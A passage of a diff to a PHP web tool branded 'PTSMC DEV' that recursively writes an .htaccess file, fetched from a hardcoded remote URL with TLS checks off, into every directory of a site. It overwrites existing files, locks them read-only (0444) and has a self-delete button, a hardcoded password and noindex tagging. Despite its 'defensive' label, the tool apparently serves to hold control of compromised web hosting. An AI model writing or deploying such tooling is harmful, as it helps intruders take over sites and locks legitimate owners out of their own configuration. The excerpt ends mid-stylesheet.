@@ -1,513 +1,1014 @@
 <?php
-/*
- * PROFESSIONAL MASS HTACCESS DEPLOYER V5 (FINAL FIX)
+/**
+ * PTSMC DEV - .htaccess Mass Deployment Tool
+ *
+ * Web UI untuk deploy .htaccess defensif (block exec PHP/SH/ASP di folder upload, dsb)
+ * secara rekursif ke target path tertentu.
+ *
+ * Fitur:
+ *  - Login terproteksi password
+ *  - Konfigurasi per-run: source URL, target path, skip dirs, dry run
+ *  - Skip folder yang sudah punya .htaccess mode 0444 (marker locked)
+ *  - Deploy hasil dengan chmod 0444
+ *  - Menampilkan HANYA daftar folder yang di-skip (karena ada .htaccess 444)
+ *  - Daftar folder dengan permission restriktif (chmod 000/111/dll) + saran perintah perbaikan
+ *  - Tombol Kill Self (hapus file script ini sendiri)
  */
-set_time_limit(0);
-ini_set('memory_limit', '-1');
-ini_set('display_errors', 0);
 
-$message = "";
-$report = []; // Array ini HANYA menampung path yang di-SKIP (yang ada 0444 nya)
-$stats = ['success' => 0, 'locked' => 0, 'fail' => 0];
+// ================= KONFIGURASI =================
+define('PTSMC_PASSWORD',          'Seobyjnx'); // WAJIB diubah
+define('PTSMC_DEFAULT_SOURCE_URL','https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/Ht-Kill'); // Hardcoded source
+define('PTSMC_DEFAULT_SKIP_DIRS', 'admin');
+define('PTSMC_DEPLOY_MODE',       0444);
+define('PTSMC_SKIP_MODE',         0444);
+define('PTSMC_MAX_DEPTH',         50);
+define('PTSMC_SESSION_NAME',      'PTSMC_SID');
+define('PTSMC_BRAND',             'PTSMC DEV');
+define('PTSMC_TAGLINE',           'BY PTSMC TEAM');
+// ===============================================
 
-// Logic Pemrosesan (TIDAK DIUBAH SAMA SEKALI)
-if (isset($_POST['execute'])) {
-    $sourceFile = trim($_POST['source_file']);
-    $baseDir = rtrim(trim($_POST['base_dir']), '/'); 
+@set_time_limit(0);
+@ini_set('memory_limit', '256M');
 
-    if (!file_exists($sourceFile)) {
-        $message = "<div class='alert error'>Error: File sumber (.htaccess) tidak ditemukan!</div>";
-    } elseif (!is_dir($baseDir)) {
-        $message = "<div class='alert error'>Error: Direktori target tidak valid!</div>";
+session_name(PTSMC_SESSION_NAME);
+session_start();
+
+if (empty($_SESSION['csrf'])) {
+    $_SESSION['csrf'] = bin2hex(random_bytes(32));
+}
+
+$authed = !empty($_SESSION['authed']) && $_SESSION['authed'] === true;
+$flash  = $_SESSION['flash'] ?? null;
+unset($_SESSION['flash']);
+
+$action  = $_POST['action'] ?? $_GET['action'] ?? '';
+$results = null;
+
+// ======== HANDLE: LOGIN ========
+if ($action === 'login' && $_SERVER['REQUEST_METHOD'] === 'POST') {
+    $password = $_POST['password'] ?? '';
+    if (PTSMC_PASSWORD === 'change_me_password_kuat_sekali') {
+        $_SESSION['flash'] = ['type'=>'error','msg'=>'Password masih default. Edit PTSMC_PASSWORD di script dulu.'];
+    } elseif (hash_equals(PTSMC_PASSWORD, $password)) {
+        $_SESSION['authed'] = true;
+        session_regenerate_id(true);
+        header('Location: '.$_SERVER['PHP_SELF']); exit;
     } else {
-        try {
-            $iterator = new RecursiveIteratorIterator(
-                new RecursiveDirectoryIterator($baseDir, RecursiveDirectoryIterator::SKIP_DOTS),
-                RecursiveIteratorIterator::SELF_FIRST
-            );
+        usleep(700000); // slowdown
+        $_SESSION['flash'] = ['type'=>'error','msg'=>'Password salah.'];
+    }
+    header('Location: '.$_SERVER['PHP_SELF']); exit;
+}
 
-            foreach ($iterator as $item) {
-                if ($item->isDir()) {
-                    $currentDir = $item->getPathname();
-                    $targetFile = $currentDir . '/.htaccess';
-                    
-                    $isLocked = false;
+// ======== HANDLE: LOGOUT ========
+if ($action === 'logout') {
+    $_SESSION = []; session_destroy();
+    header('Location: '.$_SERVER['PHP_SELF']); exit;
+}
 
-                    // 1. CEK APAKAH ADA FILE DAN STATUSNYA 0444
-                    if (file_exists($targetFile)) {
-                        $perms = substr(sprintf('%o', fileperms($targetFile)), -4);
-                        if ($perms == '0444') {
-                            $isLocked = true;
-                        }
-                    }
+if (!$authed) { render_login($flash); exit; }
 
-                    if ($isLocked) {
-                        // KONDISI SKIP:
-                        // Karena ada 0444, kita JANGAN timpa.
-                        // DAN KITA MASUKKAN KE LAPORAN (REPORT).
-                        $stats['locked']++;
-                        $report[] = [
-                            'path' => $currentDir, 
-                            'status' => 'SKIPPED (FOUND EXISTING 0444)', 
-                            'class' => 'locked'
-                        ];
-                    } else {
-                        // KONDISI EKSEKUSI (TIMPA):
-                        // Karena tidak ada 0444, kita hajar (timpa).
-                        // Dan file baru kita set jadi 0444.
-                        // TIDAK MASUK LAPORAN (Silent).
-                        
-                        // Hapus file lama jika ada (biar bersih)
-                        if(file_exists($targetFile)) { @unlink($targetFile); }
-
-                        if (@copy($sourceFile, $targetFile)) {
-                            @chmod($targetFile, 0444); // SET HASIL COPY JADI 0444
-                            $stats['success']++;
-                        } else {
-                            $stats['fail']++; // Gagal write permission folder
-                        }
-                    }
-                }
-            }
-            
-            // Pesan status akhir
-            if ($stats['locked'] > 0) {
-                 $message = "<div class='alert warning'>SELESAI. SYSTEM REPORT: " . $stats['locked'] . " PATH DI-SKIP (LOCKED 0444). LIHAT LOG DI BAWAH.</div>";
-            } else {
-                 $message = "<div class='alert success'>SELESAI. SEMUA TARGET BERHASIL DITIMPA (100% SUCCESS).</div>";
-            }
-
-        } catch (Exception $e) {
-            $message = "<div class='alert error'>CRITICAL SYSTEM ERROR: " . $e->getMessage() . "</div>";
-        }
+// CSRF guard
+function check_csrf() {
+    if (!isset($_POST['csrf']) || !hash_equals($_SESSION['csrf'] ?? '', $_POST['csrf'])) {
+        http_response_code(403); exit('CSRF check failed.');
     }
 }
 
-// Auto-fill path
-$defaultBase = getcwd();
-$defaultSource = $defaultBase . '/example/.htaccess';
-?>
+// ======== HANDLE: DEPLOY ========
+if ($action === 'deploy' && $_SERVER['REQUEST_METHOD'] === 'POST') {
+    check_csrf();
+    $sourceUrl  = trim($_POST['source_url']  ?? PTSMC_DEFAULT_SOURCE_URL);
+    $targetPath = trim($_POST['target_path'] ?? '');
+    $skipDirs   = trim($_POST['skip_dirs']   ?? PTSMC_DEFAULT_SKIP_DIRS);
+    $dryRun     = !empty($_POST['dry_run']);
+    $results    = run_deployment($sourceUrl, $targetPath, $skipDirs, $dryRun);
+    $_SESSION['last_source_url']  = $sourceUrl;
+    $_SESSION['last_target_path'] = $targetPath;
+    $_SESSION['last_skip_dirs']   = $skipDirs;
+}
 
+// ======== HANDLE: KILL SELF ========
+if ($action === 'kill_self' && $_SERVER['REQUEST_METHOD'] === 'POST') {
+    check_csrf();
+    $killed = @unlink(__FILE__);
+    $_SESSION = []; session_destroy();
+    render_kill_self($killed);
+    exit;
+}
+
+// ============================== LOGIKA DEPLOY ==============================
+
+function run_deployment($sourceUrl, $targetPath, $skipDirsStr, $dryRun) {
+    $r = [
+        'success' => false,
+        'message' => '',
+        'stats' => [
+            'dirs_scanned'   => 0,
+            'new'            => 0,
+            'overwritten'    => 0,
+            'skipped_locked' => 0,
+            'errors'         => 0,
+            'perm_denied'    => 0,
+        ],
+        'errors'            => [],
+        'permission_denied' => [],
+        'skipped_locked'    => [],
+        'source_url'        => $sourceUrl,
+        'target_path'       => $targetPath,
+        'dry_run'           => $dryRun,
+        'started_at'        => date('Y-m-d H:i:s'),
+        'duration'          => 0.0,
+        'size_bytes'        => 0,
+    ];
+    $start = microtime(true);
+
+    if ($sourceUrl === '')  { $r['message']='Source URL kosong.';  return $r; }
+    if ($targetPath === '') { $r['message']='Target path kosong.'; return $r; }
+
+    $real = realpath($targetPath);
+    if ($real === false || !is_dir($real)) {
+        $r['message'] = 'Target path tidak ada / bukan direktori: '.$targetPath;
+        return $r;
+    }
+    $r['target_path'] = $targetPath = $real;
+
+    $htContent = fetch_remote($sourceUrl);
+    if (!is_string($htContent) || trim($htContent) === '') {
+        $r['message'] = 'Gagal mengambil .htaccess dari source URL.';
+        return $r;
+    }
+    $r['size_bytes'] = strlen($htContent);
+
+    $skipDirs = array_values(array_filter(array_map('trim', explode(',', $skipDirsStr))));
+
+    deploy_walk($targetPath, 0, $r, $htContent, $skipDirs, $dryRun);
+
+    $r['duration'] = round(microtime(true) - $start, 3);
+    $r['success']  = true;
+    return $r;
+}
+
+function deploy_walk($dir, $depth, &$r, $htContent, $skipDirs, $dryRun) {
+    if ($depth > PTSMC_MAX_DEPTH) return;
+    $r['stats']['dirs_scanned']++;
+
+    if (!is_readable($dir)) {
+        record_perm_denied($r, $dir, 'folder tidak readable');
+        return;
+    }
+
+    deploy_one($dir, $r, $htContent, $dryRun);
+
+    $h = @opendir($dir);
+    if (!$h) { record_perm_denied($r, $dir, 'opendir gagal'); return; }
+
+    while (($e = readdir($h)) !== false) {
+        if ($e === '.' || $e === '..') continue;
+        $p = $dir . DIRECTORY_SEPARATOR . $e;
+        if (is_link($p)) continue;
+        if (!is_dir($p)) continue;
+        if (in_array($e, $skipDirs, true)) continue;
+        deploy_walk($p, $depth + 1, $r, $htContent, $skipDirs, $dryRun);
+    }
+    closedir($h);
+}
+
+function deploy_one($dir, &$r, $htContent, $dryRun) {
+    $target = $dir . DIRECTORY_SEPARATOR . '.htaccess';
+
+    if (file_exists($target)) {
+        $perms = fileperms($target) & 0777;
+        if ($perms === PTSMC_SKIP_MODE) {
+            $r['skipped_locked'][] = $target;
+            $r['stats']['skipped_locked']++;
+            return;
+        }
+        $type = 'overwrite';
+        if (!$dryRun) @chmod($target, 0644);
+    } else {
+        $type = 'new';
+    }
+
+    if (!is_writable($dir)) {
+        $r['errors'][] = [
+            'path'        => $target,
+            'reason'      => 'folder induk tidak writable',
+            'parent'      => $dir,
+            'parent_mode' => '0'.decoct(@fileperms($dir) & 0777),
+            'fix_cmd'     => 'chmod 755 '.shell_escape($dir),
+        ];
+        $r['stats']['errors']++;
+        return;
+    }
+
+    if ($dryRun) {
+        ($type==='overwrite') ? $r['stats']['overwritten']++ : $r['stats']['new']++;
+        return;
+    }
+
+    $ok = @file_put_contents($target, $htContent, LOCK_EX);
+    if ($ok === false) {
+        $err = error_get_last();
+        $r['errors'][] = [
+            'path'   => $target,
+            'reason' => 'file_put_contents gagal'.($err ? ': '.$err['message'] : ''),
+            'parent' => $dir,
+            'parent_mode' => '0'.decoct(@fileperms($dir) & 0777),
+            'fix_cmd' => 'chmod 755 '.shell_escape($dir).' && nano '.shell_escape($target),
+        ];
+        $r['stats']['errors']++;
+        return;
+    }
+
+    if (!@chmod($target, PTSMC_DEPLOY_MODE)) {
+        $r['errors'][] = [
+            'path'    => $target,
+            'reason'  => 'tertulis tapi chmod 0'.decoct(PTSMC_DEPLOY_MODE).' gagal',
+            'fix_cmd' => 'chmod 0'.decoct(PTSMC_DEPLOY_MODE).' '.shell_escape($target),
+        ];
+    }
+
+    ($type==='overwrite') ? $r['stats']['overwritten']++ : $r['stats']['new']++;
+}
+
+function record_perm_denied(&$r, $dir, $reason) {
+    $mode = '0'.decoct(@fileperms($dir) & 0777);
+    $r['permission_denied'][] = [
+        'path'    => $dir,
+        'mode'    => $mode,
+        'reason'  => $reason,
+        'fix_cmd' => 'chmod 755 '.shell_escape($dir),
+    ];
+    $r['stats']['perm_denied']++;
+}
+
+function shell_escape($s) {
+    return "'".str_replace("'", "'\\''", $s)."'";
+}
+
+function fetch_remote($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_TIMEOUT        => 30,
+            CURLOPT_CONNECTTIMEOUT => 15,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => 0,
+            CURLOPT_USERAGENT      => 'PTSMC-Deploy/1.1',
+        ]);
+        $body = curl_exec($ch);
+        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        if ($body !== false && $code >= 200 && $code < 400) return $body;
+    }
+    $ctx = stream_context_create(['http'=>['timeout'=>30,'user_agent'=>'PTSMC-Deploy/1.1']]);
+    return @file_get_contents($url, false, $ctx);
+}
+
+// ============================== RENDER ==============================
+
+render_dashboard($results, $flash);
+
+// -------------------- RENDER FUNCTIONS --------------------
+
+function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
+
+function render_head($title) { ?>
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Deployer</title>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;800&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --bg-color: #050505;
-            --card-bg: rgba(20, 20, 20, 0.85);
-            --primary: #ff003c; /* Cyberpunk Red */
-            --primary-dark: #b3002a;
-            --secondary: #1a1a1a;
-            --text-main: #e0e0e0;
-            --text-muted: #888;
-            --border-radius: 16px; /* Rounded tapi tegas */
-            --glow: 0 0 20px rgba(255, 0, 60, 0.3);
-            --border: 1px solid rgba(255, 0, 60, 0.2);
-        }
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title><?= h($title) ?> · <?= h(PTSMC_BRAND) ?></title>
+<style>
+:root{
+  --bg:#050000;
+  --bg2:#0a0101;
+  --card-bg:rgba(18, 4, 4, 0.85);
+  --card-border:rgba(255, 80, 0, 0.2);
+  --card-glow:rgba(255, 60, 0, 0.15);
+  --fire-main:#ff4500;
+  --fire-bright:#ff7300;
+  --fire-deep:#cc2900;
+  --fire-glow:rgba(255, 69, 0, 0.6);
+  --text:#fff;
+  --text-mute:rgba(255,255,255,.6);
+  --text-faint:rgba(255,255,255,.35);
+  --input-bg:rgba(0, 0, 0, 0.5);
+  --input-border:rgba(255, 255, 255, 0.1);
+  --green:#3ddc84;
+  --yellow:#ffc846;
+  --orange:#ff8a3d;
+  --radius:16px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{
+  font-family:"Segoe UI",Inter,Roboto,sans-serif;
+  background:var(--bg);
+  color:var(--text);
+  overflow-x:hidden;
+  min-height:100vh;
+  position:relative;
+  font-size:14px;
+  line-height:1.5;
+  -webkit-font-smoothing:antialiased;
+}
+body::before{
+  content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:
+    radial-gradient(ellipse 70% 60% at 50% 100%, rgba(180, 40, 0, 0.2) 0%, transparent 60%),
+    radial-gradient(ellipse 60% 40% at 20% 80%, rgba(200, 60, 0, 0.1) 0%, transparent 60%),
+    radial-gradient(ellipse 50% 35% at 85% 90%, rgba(160, 20, 0, 0.15) 0%, transparent 60%);
+  animation:bgPulse 8s ease-in-out infinite alternate;
+}
+@keyframes bgPulse{
+  0%{opacity:0.7; filter: hue-rotate(0deg);}
+  100%{opacity:1; filter: hue-rotate(-5deg);}
+}
+canvas#particles{position:fixed;inset:0;z-index:1;pointer-events:none}
+.wrap{position:relative;z-index:2;min-height:100vh;padding:24px}
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            scrollbar-width: thin;
-            scrollbar-color: #ff0000 var(--bg-color);
-        }
+/* ===== LOGIN ===== */
+.login-wrap{
+  min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;
+  position:relative;z-index:2;
+}
+.login-card{
+  width:100%;max-width:420px;
+  background:var(--card-bg);
+  border:1px solid var(--card-border);
+  border-radius:24px;
+  padding:48px 40px;
+  backdrop-filter:blur(20px);
+  -webkit-backdrop-filter:blur(20px);
+  box-shadow:
+    0 20px 60px rgba(0,0,0,.9),
+    0 0 40px var(--card-glow),
+    inset 0 1px 0 rgba(255,255,255,.05);
+  animation:cardIn .6s cubic-bezier(.2,.9,.3,1.1) both;
+  position:relative;overflow:hidden;
+}
+.login-card::before{
+  content:'';position:absolute;inset:-1px;border-radius:24px;padding:1px;
+  background:linear-gradient(180deg, rgba(255,80,0,.5) 0%, transparent 100%);
+  -webkit-mask:linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
+  -webkit-mask-composite:xor;mask-composite:exclude;
+  pointer-events:none;opacity:.8;
+}
+@keyframes cardIn{
+  from{opacity:0;transform:translateY(30px) scale(.98)}
+  to{opacity:1;transform:translateY(0) scale(1)}
+}
+.brand{
+  text-align:center;margin-bottom:36px;
+}
+.brand-title{
+  font-size:38px;font-weight:900;font-style:italic;letter-spacing:1px;
+  background: linear-gradient(to bottom, #fff, #ffae00, #ff2a00);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  text-shadow: 0 0 30px rgba(255, 60, 0, 0.4);
+  margin-bottom:8px;
+}
+.brand-tag{
+  font-size:11px;letter-spacing:6px;color:var(--fire-main);font-weight:700;text-transform:uppercase;
+}
+.field{margin-bottom:20px}
+.label{
+  display:block;font-size:11px;text-transform:uppercase;letter-spacing:1.5px;
+  color:var(--text-mute);margin-bottom:8px;font-weight:600;
+}
+.input,.select,.textarea{
+  width:100%;
+  background:var(--input-bg);
+  border:1px solid var(--input-border);
+  color:var(--text);
+  padding:15px 18px;
+  border-radius:14px;
+  font-size:14px;
+  font-family:inherit;
+  outline:none;
+  transition:all .3s ease;
+}
+.input::placeholder,.textarea::placeholder{color:var(--text-faint);letter-spacing:1px}
+.input:focus,.select:focus,.textarea:focus{
+  border-color:var(--fire-main);
+  box-shadow:0 0 0 4px rgba(255,69,0,.15), 0 0 20px rgba(255,69,0,.2);
+  background:rgba(20,5,0,.7);
+}
+.btn{
+  display:inline-flex;align-items:center;justify-content:center;gap:8px;
+  width:100%;
+  padding:16px 24px;
+  border:none;cursor:pointer;
+  background:linear-gradient(135deg, var(--fire-bright) 0%, var(--fire-deep) 100%);
+  color:#fff;font-weight:800;letter-spacing:3px;font-size:13px;
+  border-radius:14px;
+  transition:all .2s ease;
+  box-shadow:
+    0 10px 25px rgba(255,60,0,.4),
+    inset 0 1px 1px rgba(255,255,255,.3);
+  position:relative;overflow:hidden;
+  text-transform:uppercase;
+  font-family:inherit;
+}
+.btn::after{
+  content:'';position:absolute;inset:0;border-radius:14px;
+  box-shadow:0 0 30px rgba(255,100,0,.6);
+  opacity:0;transition:opacity .3s;pointer-events:none;
+}
+.btn:hover{transform:translateY(-2px);filter:brightness(1.15);}
+.btn:hover::after{opacity:1;}
+.btn:active{transform:translateY(1px);box-shadow:0 5px 15px rgba(255,60,0,.4);}
+.btn.btn-ghost{
+  background:transparent;
+  border:1px solid var(--input-border);
+  box-shadow:none;
+  letter-spacing:2px;
+}
+.btn.btn-ghost:hover{background:rgba(255,80,0,.1);border-color:var(--fire-main);color:var(--fire-bright)}
+.btn.btn-danger{
+  background:linear-gradient(135deg,#5a0a0a 0%, #2a0405 100%);
+  border:1px solid rgba(255,40,40,.4);
+  box-shadow:0 6px 20px rgba(160,15,15,.4);
+}
+.btn.btn-sm{padding:10px 16px;font-size:11px;width:auto;letter-spacing:2px;border-radius:10px;}
+.flash{
+  padding:14px 18px;border-radius:12px;margin-bottom:20px;font-size:13px;
+  background:rgba(220,30,30,.15);border:1px solid rgba(255,40,40,.4);color:#ffcccc;
+  animation:flashIn .4s cubic-bezier(.2,.9,.3,1.1);
+}
+.flash.success{background:rgba(60,200,120,.15);border-color:rgba(60,220,130,.4);color:#c5ffd9}
+.flash.info{background:rgba(255,150,0,.15);border-color:rgba(255,150,0,.4);color:#ffe0b2}
+@keyframes flashIn{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}
 
-        body {
-            font-family: 'JetBrains Mono', monospace;
-            background-color: var(--bg-color);
-            color: var(--text-main);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow-x: hidden;
-        }
+/* ===== DASHBOARD ===== */
+.topbar{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:16px 24px;background:var(--card-bg);
+  border:1px solid var(--card-border);
+  border-radius:var(--radius);
+  margin-bottom:24px;
+  backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);
+  animation:cardIn .5s ease-out both;
+  box-shadow:0 10px 30px rgba(0,0,0,.5);
+}
+.topbar-brand{display:flex;align-items:center;gap:16px}
+.topbar-logo{
+  width:42px;height:42px;border-radius:12px;
+  background:linear-gradient(135deg,var(--fire-bright),var(--fire-deep));
+  display:flex;align-items:center;justify-content:center;
+  font-weight:900;font-style:italic;color:#fff;font-size:18px;
+  box-shadow:0 6px 20px rgba(255,60,0,.5), inset 0 1px 1px rgba(255,255,255,.3);
+}
+.topbar-title{font-style:italic;font-weight:900;letter-spacing:1px;color:#fff;font-size:18px;text-shadow:0 0 10px rgba(255,60,0,.5);}
+.topbar-sub{font-size:10px;letter-spacing:3px;color:var(--fire-main);font-weight:700}
 
-        /* Matrix Canvas Background */
-        #matrix-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            opacity: 0.25;
-        }
+.container{max-width:1180px;margin:0 auto}
+.grid-2{display:grid;grid-template-columns:1.2fr 0.8fr;gap:24px}
+@media (max-width:900px){.grid-2{grid-template-columns:1fr}}
 
-        .container {
-            width: 100%;
-            max-width: 850px;
-            padding: 20px;
-            z-index: 10;
-            animation: slideIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
-        }
+.card{
+  background:var(--card-bg);
+  border:1px solid var(--card-border);
+  border-radius:var(--radius);
+  padding:28px;
+  backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);
+  margin-bottom:24px;
+  animation:cardIn .5s ease-out both;
+  box-shadow:0 10px 40px rgba(0,0,0,.6);
+  position:relative;
+  overflow:hidden;
+}
+.card::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg, transparent, rgba(255,100,0,.5), transparent);
+}
+.card-title{
+  font-size:12px;letter-spacing:3px;color:#fff;text-transform:uppercase;
+  font-weight:800;margin-bottom:24px;display:flex;align-items:center;gap:12px;
+}
+.card-title .dot{
+  width:10px;height:10px;border-radius:50%;background:var(--fire-main);box-shadow:0 0 15px var(--fire-bright);
+}
 
-        .main-card {
-            background: var(--card-bg);
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
-            border: var(--border);
-            border-radius: 35px;
-            padding: 3rem;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), var(--glow);
-            position: relative;
-            overflow: hidden;
-        }
+.stats{display:grid;grid-template-columns:repeat(6,1fr);gap:12px;margin-bottom:12px}
+@media (max-width:780px){.stats{grid-template-columns:repeat(3,1fr)}}
+.stat{
+  background:rgba(0,0,0,.4);border:1px solid var(--input-border);
+  border-radius:12px;padding:16px 12px;text-align:center;
+  transition:all .3s ease;
+}
+.stat:hover{border-color:var(--fire-main);transform:translateY(-3px);background:rgba(20,5,0,.6);box-shadow:0 8px 20px rgba(255,60,0,.15)}
+.stat-num{font-size:26px;font-weight:900;color:#fff;line-height:1;margin-bottom:6px;text-shadow:0 0 10px rgba(255,255,255,.2)}
+.stat-label{font-size:10px;letter-spacing:1.5px;color:var(--text-mute);text-transform:uppercase;font-weight:600}
+.stat.new .stat-num{color:#fff}
+.stat.over .stat-num{color:var(--yellow)}
+.stat.skip .stat-num{color:#a0aab5}
+.stat.err .stat-num{color:var(--fire-main)}
+.stat.perm .stat-num{color:var(--orange)}
+.stat.dirs .stat-num{color:var(--green)}
 
-        /* Header Styling */
-        h1 {
-            font-size: 2rem;
-            font-weight: 800;
-            letter-spacing: -1px;
-            margin-bottom: 0.5rem;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            text-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
-        }
+.checkbox{
+  display:flex;align-items:center;gap:12px;cursor:pointer;
+  font-size:13px;color:var(--text-mute);user-select:none;font-weight:500;
+}
+.checkbox input{
+  appearance:none;width:20px;height:20px;border-radius:6px;
+  border:1px solid var(--input-border);background:var(--input-bg);cursor:pointer;
+  position:relative;transition:all .2s;
+}
+.checkbox input:checked{background:var(--fire-main);border-color:var(--fire-main);box-shadow:0 0 15px rgba(255,69,0,.6)}
+.checkbox input:checked::after{
+  content:'';position:absolute;left:6px;top:3px;width:5px;height:10px;
+  border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg);
+}
 
-        h1 span.icon {
-            color: #ff0000;
-            text-shadow: 0 0 15px #ff0000;
-        }
+.summary{
+  display:flex;flex-wrap:wrap;gap:16px;font-size:13px;color:var(--text-mute);
+  padding:16px 20px;background:rgba(0,0,0,.4);border-radius:12px;margin-bottom:20px;
+  border:1px solid var(--input-border);
+}
+.summary b{color:#fff;font-weight:700}
+.badge{display:inline-block;padding:4px 10px;border-radius:6px;font-size:10px;letter-spacing:2px;font-weight:800}
+.badge.dry{background:rgba(255,200,70,.15);color:var(--yellow);border:1px solid rgba(255,200,70,.3)}
+.badge.live{background:rgba(60,220,130,.15);color:var(--green);border:1px solid rgba(60,220,130,.3)}
 
-        p.subtitle {
-            color: var(--text-muted);
-            font-size: 0.85rem;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 2.5rem;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            padding-bottom: 15px;
-        }
+.list-item{
+  display:flex;align-items:flex-start;gap:12px;
+  padding:14px 16px;background:rgba(0,0,0,.4);border-radius:12px;margin-bottom:10px;
+  border-left:4px solid transparent;font-size:13px;
+  animation:itemIn .4s cubic-bezier(.2,.9,.3,1.1) both;
+  transition:background .2s;
+}
+.list-item:hover{background:rgba(10,5,5,.6);}
+@keyframes itemIn{from{opacity:0;transform:translateX(-10px)}to{opacity:1;transform:translateX(0)}}
+.list-item.error{border-left-color:var(--fire-main)}
+.list-item.perm{border-left-color:var(--orange)}
+.list-item.skip{border-left-color:#6c757d}
+.list-item .meta{flex:1;min-width:0}
+.list-item .path{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:12.5px;color:#fff;word-break:break-all;font-weight:500;}
+.list-item .why{font-size:11px;color:var(--text-mute);margin-top:6px;letter-spacing:.5px;text-transform:uppercase;font-weight:600;}
+.list-item .fix{
+  margin-top:10px;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:11.5px;
+  background:rgba(0,0,0,.6);padding:10px 14px;border-radius:8px;border:1px solid var(--input-border);
+  color:#ffeb3b;display:flex;align-items:center;gap:12px;justify-content:space-between;
+}
+.list-item .fix code{flex:1;overflow-x:auto;white-space:nowrap}
+.copy-btn{
+  background:rgba(255,80,0,.15);border:1px solid rgba(255,80,0,.3);color:#fff;
+  padding:5px 12px;border-radius:6px;font-size:10px;cursor:pointer;letter-spacing:1px;font-weight:700;
+  transition:all .2s ease;font-family:inherit;
+}
+.copy-btn:hover{background:var(--fire-main);border-color:var(--fire-main);box-shadow:0 0 10px rgba(255,60,0,.4)}
+.copy-btn.copied{background:rgba(60,220,130,.2);border-color:var(--green);color:var(--green)}
 
-        /* Form Inputs */
-        .form-group {
-            margin-bottom: 1.5rem;
-            position: relative;
-        }
+.section-head{
+  display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;
+  padding-bottom:12px;border-bottom:1px solid rgba(255,255,255,.05);
+}
+.section-head h3{font-size:14px;letter-spacing:1.5px;text-transform:uppercase;color:#fff;font-weight:800}
+.count-pill{
+  background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.15);color:#fff;
+  padding:4px 12px;border-radius:12px;font-size:11px;font-weight:800;letter-spacing:1px;
+}
+.count-pill.orange{background:rgba(255,138,61,.15);border-color:rgba(255,138,61,.3);color:var(--orange)}
+.count-pill.grey{background:rgba(150,160,170,.15);border-color:rgba(150,160,170,.3);color:#daddf0}
+.count-pill.red{background:rgba(255,60,0,.15);border-color:rgba(255,60,0,.3);color:var(--fire-main)}
 
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-size: 0.75rem;
-            font-weight: 800;
-            color: #ff0000;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
+.kill-zone{
+  margin-top:40px;padding:28px;border-radius:var(--radius);
+  background:linear-gradient(135deg, rgba(30,5,5,.8), rgba(10,0,0,.9));
+  border:1px dashed rgba(255,60,0,.4);
+  display:flex;align-items:center;justify-content:space-between;gap:20px;flex-wrap:wrap;
+  box-shadow:inset 0 0 40px rgba(255,0,0,.05);
+}
+.kill-zone-info{flex:1;min-width:240px}
+.kill-zone-info h4{font-size:14px;color:var(--fire-main);letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;font-weight:800;}
+.kill-zone-info p{font-size:13px;color:var(--text-mute);line-height:1.6}
+.kill-zone .btn{width:auto;flex:0 0 auto}
 
-        input[type="text"] {
-            width: 100%;
-            padding: 18px 20px;
-            background: rgba(0, 0, 0, 0.6);
-            border: 1px solid #333;
-            border-radius: 20px;
-            color: #fff;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.95rem;
-            transition: all 0.3s ease;
-        }
+.modal{
+  position:fixed;inset:0;z-index:50;display:none;align-items:center;justify-content:center;
+  background:rgba(0,0,0,.85);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);
+  padding:24px;
+}
+.modal.show{display:flex;animation:fadeIn .25s ease-out}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+.modal-body{
+  max-width:460px;width:100%;
+  background:var(--card-bg);border:1px solid rgba(255,60,0,.5);
+  border-radius:20px;padding:36px;text-align:center;
+  box-shadow:0 30px 80px rgba(0,0,0,.8),0 0 60px rgba(255,60,0,.2);
+  animation:cardIn .4s cubic-bezier(.2,.9,.3,1.1) both;
+}
